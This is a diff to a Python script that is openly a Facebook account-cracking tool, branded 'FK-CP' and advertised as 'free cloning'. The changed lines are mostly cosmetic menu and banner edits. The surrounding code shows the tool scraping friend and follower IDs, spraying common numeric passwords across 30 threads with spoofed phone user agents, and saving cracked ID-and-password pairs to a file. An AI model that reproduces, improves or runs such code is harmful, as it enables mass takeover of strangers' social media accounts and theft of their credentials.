@@ -89,16 +89,14 @@ def logo():
 \033[1;97mAuthor     : Fariya Khan Official.
 \033[1;97mFacebook   : m.facebook.com/Faritricker007
 \033[1;97mPage       : m.facebook.com/TechFari007
-\033[1;97m--------------------------------------------------
-""")
+\033[1;97m--------------------------------------------------""")
 	print("\t\x1b[1;97m [!] Your IP Address : \x1b[1;92m") + ip
 	print("\t\x1b[1;97m [!] Your Country : \x1b[1;92m") + loc
-	print("\033[1;97m--------------------------------------------------\n")
+	print("\033[1;97m--------------------------------------------------")
 
 def main():
     os.system("clear")
     logo()
-    print("")
     print(" \033[1;97m[1] Login With Access-Token")
     print(" \033[1;97m[2] How To Get Access-Token Without Any Problem")
     print(" \033[1;97m[3] Tech Fari Youtube")
@@ -184,6 +182,7 @@ def menu():
 	except requests.exceptions.ConnectionError:
 		exit(" [!] no internet connection")
 	logo()
+	print("\t ENJOY FREE CLONING ")
 	print("\033[1;97m--------------------------------------------------")
 	print"\t [ Logged User \033[1;93m"+nama+"\033[1;97m ]"
 	print("\033[1;97m--------------------------------------------------")
@@ -280,7 +279,8 @@ def publik():
 			nama = i["name"].rsplit(" ")[0]
 			id.append(uid+"<=>"+nama)
 	except KeyError:
-		exit(" \033[1;97m[!] Account Not Available OR Private FriendList")
+		print(" \033[1;97m[!] Account Not Available OR Private FriendList")
+		menu()
 	print(" \033[1;97m[+] Total ID  : \033[0;91m%s\033[0;97m"%(len(id))) 
 
 def follower():
@@ -299,7 +299,8 @@ def follower():
 			nama = i["name"].rsplit(" ")[0]
 			id.append(uid+"<=>"+nama)
 	except KeyError:
-		exit(" \033[1;97m[!] Account Not Available OR Private Followers")
+		print(" \033[1;97m[!] Account Not Available OR Private Followers")
+		menu()
 	print(" \033[1;97m[+] Total ID  : \033[0;91m%s\033[0;97m"%(len(id))) 
 
 def massal():
@@ -369,7 +370,7 @@ def method():
 		ask = raw_input(" \033[1;97m[!] Use Manual Password ? y/n: ")
 		if ask == "y" or ask == "Y":
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n \033[1;97m[!] Pass Example: 102030, 556677, 786786")
+				print("\n \033[1;97m[!] Pass Example: 102030,556677,786786")
 				asu = raw_input(" \033[1;97m[!] Set Pass : ").split(",")
 				if len(asu) =="":
 					exit(" \033[1;97m[!] don't be empty")
@@ -397,7 +398,7 @@ def method():
 		ask = raw_input(" \033[1;97m[!] Use Manual Password ? y/n: ")
 		if ask == "y" or ask == "Y":
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n \033[1;97m[!] Pass Example: 102030, 556677, 786786")
+				print("\n \033[1;97m[!] Pass Example: 102030,556677,786786")
 				asu = raw_input(" \033[1;97m[!] Set Pass : ").split(",")
 				if len(asu) =="":
 					exit(" \033[1;97m[!] don't be empty")
@@ -489,7 +490,7 @@ def api(uid, pwx):
 				month = (" ")
 				year = (" ")
 			except:pass
-			print("\r  \033[0;93m* --> %s|%s\033[0;97m        "%(uid, pw))
+			print("\r  \033[0;93m[FK-CP] %s|%s\033[0;97m        "%(uid, pw))
 			cp.append("%s|%s"%(uid, pw))
 			open("CP/%s.txt"%(tanggal),"a").write("  [FK-CP] %s|%s\n"%(uid, pw))
 			break
@@ -562,7 +563,7 @@ def crack(uid, pwx, host, **kwargs):
 def setting_ua():
 	logo()
 	print("\t [ Choose Your Phone User Agent ]")
-	print("\033[1;97m--------------------------------------------------")
+	print("\033[1;97m--------------------------------------------------\n")
 	print(" \033[1;97m[1] Xiaomi")
 	print(" \033[1;97m[2] Samsung")
 	print(" \033[1;97m[3] Nokia")
@@ -696,4 +697,3 @@ if __name__ == "__main__":
 	os.system("touch login.txt")
 	buat_folder()
 	login()
-
